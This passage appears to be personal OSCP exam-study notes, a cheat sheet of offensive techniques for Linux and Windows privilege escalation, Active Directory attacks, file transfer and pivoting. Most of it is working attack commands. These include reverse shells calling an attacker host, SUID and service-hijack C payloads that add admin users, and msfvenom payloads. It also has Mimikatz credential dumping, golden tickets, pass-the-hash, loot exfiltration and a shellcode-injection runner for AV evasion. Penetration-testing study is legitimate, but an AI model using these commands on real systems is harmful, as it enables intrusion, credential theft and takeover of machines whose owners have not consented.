#### Binary Symlink Escalation
Vulnerability with nginx, an http and reverse proxy server
https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html

#### Escalation via Environmental Variables
Run the find SUID command, then run strings on the binary if you don't know what it does
If it starts a service from the PATH, you can `print $PATH`
- If it doesn't have a direct PATH:
	- one line c command: `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c`
	- so the one liner is actually: `int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}`
	- then `gcc /tmp/service.c -o /tmp/service`
	- then: `export PATH=/tmp:$PATH`
	- This means that when you call a service, the system will check /tmp first as it is the start of the PATH
- If it does have a direct PATH (like /usr/sbin/service)
	- `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
	- `export -f /usr/sbin/service` - 

#### Capabilities
`getcap -r / 2>/dev/null` - this will show up during linpeas, but it's still good to know 

#### NFS Root Squashing
- `cat /etc/exports`
	- if it says `'no_root_squash'` then the directory shown is shareable and can be mounted
	- Because it's no root squash, everything we do as root on our machine, it will be as root as the target machine even though we are a normal user on the target
so from kali: 
- `mkdir /tmp/mountme`
- `mount -o rw,vers=2 $kaliIP:/tmp /tmp/mountme`
- `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c`
- `gcc /tmp/mountme/x.c -o /tmo/mountme/x`
- `chmod +s /tmp/mountme/x`
then from target:
- `./x`

#### Other
Reverse shells:
- `busybox nc $kaliIP 4444 -e sh`
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $kaliIP $kaliPort >/tmp/f`

Add file to path:
`export PATH="/usr/lib/gcc/i486-linux-gnu/4.6/:$PATH"`

If you can edit `/etc/sudoer`:
- `"echo $user ALL=(ALL) NOPASSWD: ALL >> c:$LFILE"`

Remember that backticks can take precedence over other commands. Ex:
- In URL: 10.10.186.101:8081/ping?ip=`ls`

## After Windows Foothold

### Local Enumeration

#### cmd
User enum:
- `whoami`
- `whoami /groups` - display groups of current user
- `whoami /priv` - check our privileges
- `net user` - get list of all local users on machine (this will not include service accounts such as inetserv)
- `net user steve` - get user info for steve
- `net group` - all local groups
- `net localgroup administrator` - can sometimes not work as just `net localgroup` if we don't have a logged in session
findstr (grep for Windows) commands: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr
- `wmic qfe` - check patches
- `wmic logicaldisk get caption, description, providername` - checks drives
Network enum:
- `ipconfig` or `ipconfig /all`
- `arp -a` - (arp -all) - checks IP and MAC addresses
- `netstat -ano` - what ports are listening/connected, take note if anything is firewalled or not shown in the originalnmap scan

Running Processes/Services
`tasklist` - Get a list of running processes
`tasklist /SVC` -  services

Scheduled Tasks:
- `schtasks /query /fo LIST /v`

Search:
- `where /R c:\windows bash.exe` - where in `C:\Windows` is bash.exe (/R means recursive)
- `dir /R` - like `ls -la`

Password hunting:
- `findstr /si password *.txt *.ini *.config` - checks from whichever directory and subdirectories and ignores case for the string password
- `cmdkey /list` - To list the stored credentials on the machine.
- `reg query HKLM /f pass /t REG_SZ /s` - pay attention to ControlSet keys

##### TCM Password Hunting
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

#### Powershell
- `Get-LocalUser` - get list of all local users
- `Get-LocalUser steve` - same as net user steve
- `Get-LocalGroup` - all local groups
- `Get-LocalGroupMember $groupName` - list of users in that group
- `systeminfo` - OS, version, architecture, etc
- `ipconfig /all` - list all network interfaces
- `route print` - display routing table containing all routes of the system
- `netstat -ano` - list all active network connections
	- a = all active TCP connections as well as TCP and UDP ports
	- n = disable name resolution
	- o = show process ID for each connection
- `Get-Process` - show running processes
- `Get-Process $processName | Format-List *` - get all information about a process

Finding info about applications:
- `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\" | select displayname`- Displays 32 bit applications (remove 'select displayname' for more info)
- `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` - Displays 64 bit applications (remove 'select displayname' for more info):


Searching for specific things:
- Command for finding ".kdbx" (KeePass) files:
	- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` (for Keepass db)
- Command for finding sensitive XAMPP info files:	
	- `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- Checking for files in home directory
	- `Get-ChildItem -Path C:\Users\$user\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`

Runas:
	- `runas user:$user cmd` 
		- will have to enter password after, but it gets a shell as that user
	- `C:\Windows\System32\runas.exe /user:$DOMAIN\$User /save cred "C:\Windows\System32\cmd.exe /c $Command`
	- `C:\Windows\System32\runas.exe /user:$DOMAIN\$User /save cred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\proof.txt > $outputlocation.txt`
- `Get-History` - may not work
- `(Get-PSReadlineOption).HistorySavePath`
	- Then `cat` or `type` output file and check that output for interesting files
Download file from remote server
	- `iwr -uri http://$kaliIP/file.ext -outfile file.ext`

#### Checking privileges on service binaries
https://github.com/gtworek/Priv2Admin - which privileges can do what
  - `icacls` Windows utility or  
  - `Get-ACL` -  PowerShell Cmdlet

### Active Directory
#### adPEAS.ps1
- `Import-Module .\adPEAS.ps1` then `Invoke adPEAS`
- And now you wait for things to happen.  It will begin searching for SPNs, kerberoastable accounts, and exporting a bunch of domain info to a .zip file for Bloodhound.  At this point I would look through the text output and see what you have.  if you have any kerberoastable accounts, try to crack the hashes with hashcat.  Not gonna put hashcat commands here bc I respect your intelligence.  Look for high value targets, see what your goal should be.
- The biggest thing is to transfer the .zip file back to your machine and import it into bloodhound.  Copy it to an SMB share if you can.  This can help visualize targets.
- Before launching bloodhound:`neo4j console`
- Then just drag the zip into bloodhound and mess with it.  I'm being vague here so you can figure some of this out.  Try a bunch of different things on the analysis tab, and see what you can find.  Look for domain admins, how to get there, and what accounts you have access to an what they are good for.  Learn to be comfortable with bloodhound.
- If adPEAS didn't get you any credentials or valuable info, you might need to run Rubeus or Mimikatz manually.  Or you might need to enumerate better, maybe theres something else you can find locally...Services, config files...backups?

#### PowerView.ps1
- `Import-Module .\PowerView.ps1`- (May Need "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser")
- `Get-NetDomain`
- `Get-NetUser`
- `Get-NetUser | select cn` (common name)
- `Get-NetUser | select cn,pwdlastset,lastlogon`
- `Get-NetGroup | select cn`
- `Get-NetGroup "Fart Department" | select member` (get members of the Fart Department)
- `Get-NetComputer`
- `Get-ObjectAcl -Identity $user`
- `Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
	- (For example, pick different items to select)
- `Convert-SidToName $SID` - (like S-1-5-21-1987370470-658905705-1781884369-1103)
- `Find-LocalAdminAccess` -  (scanning to find local admin privileges for our user)
- `Get-NetSession -ComputerName $computerName`
	- (The permissions required to enumerate sessions with NetSessionEnum are defined in the SrvsvcSessionInfo registry key, which is located in the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity` hive.)
- `Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl`
- `Get-NetUser -SPN | select samaccountname,serviceprincipalname`
	- (Another way of enumerating SPNs is to let PowerView enumerate all the accounts in the domain. To obtain a clear list of SPNs, we can pipe the output into select and choose the samaccountname and serviceprincipalname attributes)
- `Find-DomainShare`
- `ls \\dc1.corp.com\sysvol\corp.com\` (for example)
- `cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml`
	- gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"

#### PowerUp.ps1
`Import-Module ./PowerUp.ps1`
- `. .\PowerUp.ps1`
Invoke-AllChecks
- Check Abuse Function which gives necessary command

#### Rubeus usage (local)
- `.\Rubeus.exe asreproast /nowrap` - Displays the vulnerable user and their AS-REP hash
- `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
	- Displays the vulnerable user and their TGS-REP hash (use bloodhound to see what they are worth)
	- This is the remote version, but you still need creds:
		- `Impacket-GetUserSPNs.py [DOMAIN]/[ACCT]:[PASSWD] -dc-ip [DCIP] -request`

#### Misc AD Techniques
Run GetNPUsers.py to ASREPROAST: `impacket-GetNPUsers $domainName/ -usersfile $user.txt -format $AS_REP_responses_format [hashcat | john] -outputfile $output.txt`
Run Bloodhound from attacker (rather than using Sharphound):
- `bloodhound-python -u $user -p '$password' -ns $ip -d domain.offsec -c all

### Other Techniques
#### TCM list of Automated Tools
Executables:
- **winPEAS.exe** - windows privilege escalation awesome script (check hacktrick bc it has the checklist)
- Seabelt.exe - has to be compiled (sln files open in Visual Studio)
- Watson.exe - has to be compiled (sln file)
- **SharpUp.exe**

PowerShell
- Sherlock.ps1 (predecessor to Watson)
- **PowerUp.ps1**
- jaws-enum.ps1 (jaws = just another windows script)

Other
- windows-exploit-suggester.py (local from attack machine)
	- requires `systeminfo` output from the machine
	- seems to be mostly kernel exploits
- Exploit Suggester (Metasploit)

#### Registry Escalation:
- `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer` 
- `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`
 - If either of these are set to 1, you can run any msi with elevated permissions.  Make an MSI and execute it.  
 - PowerUp checks for this. 
	 - Note that you may need to execute any file written after running the Abuse Function. 
	 - Can also just create a .msi with msf. 
 
#### Service Escalation - Registry (TCM)
Example for the regsvc service:
- Powershell on target: `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
	-  take note if we have `NT AUTHORITY\INTERACTIVE Allow Full Contol` for this service. If we do we can make a malicious executable run a command. 
- create a malicious .c file and compile it: 
	- Example: 
	- take an existing file and replace the command used by the system() function to: `cmd.exe /k net localgroup administrators $user /add`
	- `x86_64-w64-mingw32-gcc $exploit.c -o $exploit.exe`
	- this adds the $user to the administrators group
- `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d $exploit.exe /f`
- `sc start regsvc`

#### Escalation Via Executable Files (TCM)
- PowerUp.ps1
- It will give a ServiceName, Path, ModifiablePath, ... and AbuseFunction
- Take $servicename.exe and replace the existing version in the modifiable path

#### Escalation via Startup Applications
- `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
- Generate the exe wth msfvenom
- Put the exe in the above folder
- Need to reboot or have an administrator log in/out
- Probably won't see this in CTF or lab environment

#### DLL Hijacking
Go into process monitor and set filters for "Path ends with .dll" and "Result is NAME NOT FOUND"
- We can overwrite if we can control the service and if the folder is writable
	- If we have a vulnerable service called dllsvc:
	1. `sc start dllsvc` (or stop first, then start)
	2. Then check ProcMon
	3. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll`
	4. Then stop and start again
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking

#### Escalation via Binary Paths
- run PowerUp.ps1 - `Invoke-AllChecks`
- If our user has the `“SERVICE_CHANGE_CONFIG”` permission on the `daclsvc` service:
	- `sc config daclsvc binpath= "net localgroup administrators $user /add"`
	- `sc stop daclsvc` and `sc start daclsvc`

#### Unquoted Service Path Escalation
- PowerUp.ps1
- Example service path: `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
- when the system is trying to run this executable, it will check for `Program.exe`, `Program Files.exe`, `Program Files\Unquoted.exe`... etc. So the goal is to place our malicious executable in any of those directories we have write access to. The example lab uses: `C:\Program Files\Unquoted Path Service\Common.exe`

#### CVE-2019-1388
If you get a pop up that says `To continue, enter an admin user name and password.` and has a `Show more details` option, you may be able to open up an internet explorer window showing the publisher's certificate. It will open it up as a SYSTEM level user, so you can use internet explorer to pop a shell. 
- Wheel
- Save as
- File
- Search for cmd, then right click and open it. It will open as `nt authority\system`. 

#### UAC Bypass
 Goal is to replace a service exe and either restart the service or reboot (`shutdown /r /t 0`) 
Malicious.c file below:
```
#include <stdlib.h> 

int main () 
{ 
int i; 

i = system ("net user evil Ev!lpass /add"); 
i = system ("net localgroup administrators evil /add"); 
   
return 0; 
}
```
Compile the C Program above, and you can use it to create a new admin user (`user1:Ev!lpass`).
-`i686-w64-mingw32-gcc adduser.c -o adduser.exe` 


### Potato Family
When you have SeImpersonatePrivilege
- PrintSpoofer: `.\PrintSpoofer.exe -c "nc.exe $kaliIP $port -e cmd"`
- GodPotato:  `.\GodPotato -cmd “nc -t -e C:\Windows\System32\cmd.exe $kaliIP $port`
- Sweet Potato (where r.exe = msfvenom shell):`.\SweetPotato.exe -e efsrpc '/temp/r.exe'` 


### Mimikatz (local)
One liner: `.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "lsadump::sam" "exit"`
 1. privilege::debug
 2. token::elevate
 3. lsadump::sam
 4. sekurlsa::logonpasswords
 5. lsadump::dcsync /user:\<domain>\\\<user> (to obtain NTLM hash)
	 - Then from kali: `impacket-secretsdump -just-dc-user $user $domain.com /$user:"$password"@$targetIP`
	 - From kali: `impacket-psexec -hashes 00000000000000000000000000000000:\<NTLM hash> Administrator@\$targetIP`
 - From a GUI must be run as admin, (or in a cmd that is running as admin).  UAC stops it otherwise.


#### Misc Windows Privesc 
Running Processes Powershell
- `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
	- NOTE:  You cannot see higher priv processes in windows

Search for unquoted service paths:
- `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`

show firewall profile:
- `netsh advfirewall show currentprofile`
- `netsh advfirewall firewall show rule name=all`

Enumerate Installed Programs
- `wmic product get name, version, vendor`

Enumerate Windows Updates
- `wmic qfe get Caption, Description, HotFixID, InstalledOn`

Check for folders/files Everyone can write to:
- `Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`

List drivers:
- (cmd)`driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
- (powershell) `Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}`

Notes:
- Run `ls`, `Get-ChildItem`, or `gci` with `-force` (like `ls -la` but for Windows)

## File Transfer

### Python server
- From kali: `python3 -m http.server $port`
- From target Windows: 
	- powershell: `iwr -uri http://$kaliIP:$port/$file -o $file`
	- cmd: `certutil.exe -urlcache -split -f http://$kaliIP/$file C:\Windows\temp\$file
- From target Linux:
	- `wget http://$kali IP:$port/$file`

### nc
1. on target - `nc -w 3 $kaliIP 4444 < file.txt`
2. on kali - `nc -lvnp 4444 > file.txt`

### SMB
- From kali: 
	- `sudo impacket-smbserver -smb2support $shareName $sharedDirectory -username "$kaliUser" -password "$kaliPass"`
- From target:  
	- `net use m: \\$kaliIP\$shareName /user:$kaliUser $kaliPass
	- `copy/get $file m:\
- Example:
1. on kali - `sudo impacket-smbserver -smb2support share . -username "pop" -password "party1"`
2. on target - `net use \\$kaliIP\share /user:pop party1`
3. on target - `copy $file \\$kaliIP\share`

### Over RDP
- `xfreerdp /u:admin /p:password /v:$target /drive:/$directoryToShare,$nameToShare

### SSH/SCP
`scp -P $sshPort $file $user@$targetIP:$destFolder`

### FTP
- From Kali: `python -m pyftpdlib -p 21 --write` (to provide write access)
- From windows: `ftp $kaliPass` (anonymous:anonymous)

### wsgidav
`wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root $directoryToShare
- host specifies the host to listen to, "0.0.0.0" means all interaces, "--auth=anonymous" disables authentication (fine for sharing specific files during this context), and the "--root" flag specifies the directory to share. 

### .vbs file
Downloads a file from a self hosted web server:

	echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
	echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
	echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
	echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
	echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
	echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
	echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
	echo  Err.Clear >> wget.vbs 
	echo  Set http = Nothing >> wget.vbs 
	echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
	echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
	echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
	echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
	echo  http.Open "GET", strURL, False >> wget.vbs 
	echo  http.Send >> wget.vbs 
	echo  varByteArray = http.ResponseBody >> wget.vbs 
	echo  Set http = Nothing >> wget.vbs 
	echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs 
	echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
	echo  strData = "" >> wget.vbs 
	echo  strBuffer = "" >> wget.vbs 
	echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
	echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
	echo  Next >> wget.vbs 
	echo  ts.Close >> wget.vbs
SAMPLE USAGE:
`cscript wget.vbs http://$kaliIP/evil.exe evil.exe` 

### Similar script builder for powershell:
	echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
	echo $url = "http://[IP]/evil.exe" >>wget.ps1 
	echo $file = "new-exploit.exe" >>wget.ps1 
	echo $webclient.DownloadFile($url,$file) >>wget.ps1

Usage: 
	- `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1` 
	- `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$kaliIP/winPEAS.bat, 'winpeas.bat')`

### exe2hex
exe2hex converts to a script that recreates the file from hex string via non-interactive methods:

`powershell.exe (New-Object System.Net.WebClient).UploadFile('C:\Users\Administrator\loot.zip', 'http://$kaliIP$/20220204195540_loot.zip')`

## Kerberos 
You can use Kerbrute to enumerate accounts without ever having to exploit a machine:
`kerbrute userenum --dc [IP] -d CONTROLLER.local /home/kali/Documents/TryHackMe/Labs/Attacking_Kerberos/User.txt`
-Note you will need to add an entry to your /etc/hosts file.

### Rubeus (local)
https://github.com/GhostPack/Rubeus
- `Rubeus.exe harvest /interval:30` - to harvest tickets
- `rubeus.exe kerberoast`-  to get hashes of kerberoastable accounts.  Use bloodhound to see if they are worth anything.
- `Rubeus.exe asreproast`
	- can be cracked with hashcat
	- YOU MAY NEED TO ADD 23$ TO THE HASH!! PAY ATTENTION TO THE FORMAT!!!

### Impacket (remote)
Impacket-GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip [IP] -request

### Mimikatz
- Can be used to dump creds, but it can also be used to gain Domain Admin tickets and impersonate them.  Obviously great for privesc.
- Steps:
	- `mimikatz.exe`
	- `privilege::debug` - if you run and don't get 20, it won't work
	- `sekurlsa::tickets /export` - to export tickets on machine. 
		- we can impersonate the ticket.  Recommend using an admin ticket...duh kerberos::ptt $ticket
	- `lsadump::lsa /patch` - If you are on a DC you can dump the hashes
	- `lsadump::lsa /inject /name:krbtgt` - can also create a golden ticket on a DC:
		- kerberos::golden /user: /domain: /sid: /krbtgt: /id:
		- you can access any machine in the domain
			- `misc::cmd`
			- `\\MACHINE1 cmd.exe`

## Port Forwarding, Mirroring

### Ligolo
[Guide)[https://medium.com/@Thigh_GoD/ligolo-ng-finally-adds-local-port-forwarding-5bf9b19609f9] <br>
**Basic usage**
From Kali:
1. `sudo ip tuntap add user pop mode tun ligolo`
2. `sudo ip link set ligolo up`
3. `sudo ip route add $targetIP.0/24> dev ligolo`
4. `./proxy -selfcert`

From Windows Target (agent file):
1. `.ligolo.exe -connect $kaliIP:11601 -ignore-cert`

OR

From Linux Target (agent file):
1. `ligolo -connect $kaliIP:11601 -ignore-cert

Then from Kali:
1. `session`
2. `1`
3. `Start`
	1. `listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:6666`
	This allows you to access port 5555 on target from 127.0.0.1:6666 (kali machine). 

 **Local Port Forwarding:**
	- `ip route add 240.0.0.1/32 dev`
	- **240.0.0.1** will point to whatever machine Ligolo-ng has an active tunnel on.

### Other tools
While the OSCP Lab discusess other tools such as socat, sshuttle, and plink, I found that [Ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) was able to provide all of the same functionality and more simply. That said, I am linking a guide discusess the other tools. Here is frankyyano's [Pivoting & Tunneling guide](https://medium.com/@frankyyano/pivoting-tunneling-for-oscp-and-beyond-33a57dd6dc69). 

### Tips 
Port scanning through a tunnel can take a while, and it may be only TCP scans that work so no UDP or ICMP


## Steganography
1. Binwalk - A tool for searching binary files for embedded hidden files and data. 
	1. `binwalk $file # Displays the embedded data`
	2. `binwalk -e file # Extracts the data`
	3. `binwalk --dd ".*" $file # Extracts all data`
2. strings
	1. `strings $file`
	2. `strings -n 6 $file # Extracts strings with a minimum length of 6`
3. file
	1. `file $file`
4. exiftool
	1. `exiftool $file`

## Shell Upgrades

python3 -c 'import pty; pty.spawn("/bin/bash")'

Cheat Sheet: https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html

### to get a reverseshell from a non interactive cmd, upload Invoke-ConPtyShell and execute
- https://github.com/antonioCoco/ConPtyShell/blob/master/README.md
-  `powershell IEX(IWR http://192.168.45.230/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.230 443`

### Make a note of this somewhere
`busybox nc 10.10.10.10 1234 -e sh`

### getting a better shell with socat
 1. From kali
- sudo socat file:'tty',raw,echo=0 tcp-listen:443
 2. From target
- socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.230:443

### get better shell from reverse shell:
1. CTRL Z
2. stty raw -echo; fg
3. export TERM=xterm


## Upgrading Shells to fully interactive

### Python
1. python -c 'import pty; pty.spawn("/bin/bash")'
2. background reverse shell using CTRL-Z
3. echo $TERM
4. stty -a
	5. Take note of the TERM type and size of the tty 
		6. Ex: xterm-256 color and rows 38; columns 116
5. Then with the reverse shell still in background "stty raw -echo"
6. fg
7. reset
8. export SHELL=bash
9. export TERM=xterm-256 color (for example)
10. stty rows 38 columns 116 

### Without Python there are others
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys

# Various 
## Antivirus Evasion
As these are my OSCP notes, and AV Evasion is outside the scope of the exam, I'm mostly leaving this content out of the guide for brevity. Below is a script for manual exploitation. It must be saved as an .ps1 file, transferred to the victim Windows machine, and ran (after powershell -ep bypass). 

    $code = '
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("msvcrt.dll")]
    public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
    
    $winFunc = 
      Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
    
    [Byte[]];
    [Byte[]]$sc = <place your shellcode here>;
    
    $size = 0x1000;
    
    if ($sc.Length -gt 0x1000) {$size = $sc.Length};
    
    $x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
    
    for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
    
    `$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };`


### TCM Notes Windows Privesc Notes

Service Control:
- `sc query windefend` - checks Windows Defender
- `sc queryex type= service` - shows all services running on the machine

Firewalls
- check the netstat -ano to see what ports are open
- `netsh advfirewall firewall dump`
- `netsh firewall show state`
- `netsh firewall show config` - just keep these in mind, but these should be automated when looking at automated tools

## LAPS

### To get LAPS password ("ms-mcs-AdmPwd") either:
1. `nxc ldap $target -u $user -p $password --kdcHost $target -M laps`
2. `python3 pyLAPS.py --action get -u '$user' -d 'butchy.offsec' -p '$password' --dc-ip $target`
3. pyLAPS.py can also get it using NTLM (`-p NTLM:NTLM`)

## Metasploit

### Initial Usage
Selecting a module:
  - show auxiliary - shows auxiliary modules
  - search type:auxiliary smb - searches for auxiliary modules which include smb
  - info - after selecting learn more about the module
  - vulns - after running check to see if there were any discovered
  - creds - check for any creds discovered during the use of msfconsole
  - search Apache 2.4.49 - search for Apache 2.4.49 exploits
 Dealing with sessions:
  - sessions -l - list sessions 
  - sessions -i 2 - initiate session 2
Dealing with channels (meterpreter):
  - ^Z - background channel - y
  - channel -l - list channels
  - channel -i - channel -i 1
Dealing with jobs:
  - run -j
  - jobs - checks for runnign jobs

Local commands:
  - lpwd - local (attacking machine) pwd
  - lcd - local (attacking machine) cd
  - upload /usr/bin/<binary> /tmp/ - uploads binary such as linux-privesc-check from Attacking machine to target

Payloads (msfvenom)
  - msfvenom -l payloads --platform windows --arch x64 - lists payloads for windows 64 bit 
  - msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.157 LPORT=443 -f exe -o nonstaged.exe - creates a reverse shell tcp payloads on that for attacker (LHOST) with the exe format and the name nonstaged.exe
  - iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe (execute from Target to download shell)
    - use nc -lvnp 443 or multi/handler
  - use multi/handler - exploit in msf
  - set payload windows/x64/shell/reverse_tcp - so either set up in nc or msfconsole's multi/handler

### Post Exploit 
- idletime (meterpreter) - check that user's idletme
- shell - switch to shell
  - whoami /priv 
- getuid - check user *from meterpreter*
- getsystem - elevate privileges from meterpreter
- ps 
  - then migrate <PID> (check to see if other users are running it)
  - execute -H -f notepad
    - -H = hidden, -f = program
- Check Integrity Level of current process:
  - shell
  - powershell -ep bypass
  - Import-Module NtObjectManager
  - Get-NtTokenIntegrityLevel 
    - If that doesnt work then move on, if it does:
      - search UAC - search for UAC bypass modules
      - use exploit/windows/local/bypassuac_sdclt
        - set SESSION \<x><br>
- From meterpreter:
  - load kiwi (loads mimikatz)
  - help - shows all commands, including creds_msv

## Misc Notes

### Remember
1. you can mkdir a temp directory and write to it
2. One liners if you can't load a module and then run it: `powershell -ep bypass ./PowerUp.ps1` 

### to add to a file without nano 
cat <<'EOT'> file.name
> text
> text
> EOT
(the EOT ends the file)

### apparently secret python reverse shell
`python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.235",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")"`
- same as Python #2 from rev shells, but with the interior "'s escaped with \'s

### Cron jobs - linpeas

```
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                     
/usr/bin/crontab                                                                                                                                                                                                                           
incrontab Not Found
-rw-r--r-- 1 root root   74 Oct 31  2019 /etc/cron.deny                                                                                                                                                                                    
-rw-r--r-- 1 root root   66 Jan 15  2021 /etc/crontab.bak

/etc/cron.d:
total 12
drwxr-xr-x  2 root root 4096 Nov  5  2020 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..
-rw-r--r--  1 root root  128 Oct 31  2019 0hourly

/etc/cron.daily:
total 8
drwxr-xr-x  2 root root 4096 Oct 31  2019 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Nov  5  2020 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..
-rwxr-xr-x  1 root root  580 Oct 31  2019 0anacron

/etc/cron.monthly:
total 8
drwxr-xr-x  2 root root 4096 Oct 31  2019 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..

/etc/cron.weekly:
total 8
drwxr-xr-x  2 root root 4096 Oct 31  2019 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..

/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Jul 27 17:08 cron.daily
-rw------- 1 root root    9 Jul 27 17:48 cron.monthly
-rw------- 1 root root    9 Jul 27 17:28 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh


SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
RANDOM_DELAY=45
START_HOURS_RANGE=3-22

```

This means that pull.sh is executed every two minutes, and backups.sh is every 3 minutes. 


### Python Errors
#### Wrong Modules
1. `sudo apt-get install python3-venv`
2. `python3 -m venv myenv`
3. `source myenv/bin/activate
4. Then install what you actually need:
	1. `pip install -r requirements.txt` OR
	2. - `pip install requests urllib3==1.26.8 charset_normalizer==2.0.12` With specific modules named
5.  `python $script.py`
6.  `deactivate`

#### SSL Error
Run these three commands:
1. `export PYTHONWARNINGS="ignore:Unverified HTTPS request"`
2. `export REQUESTS_CA_BUNDLE=""`
3. `export CURL_CA_BUNDLE=""`
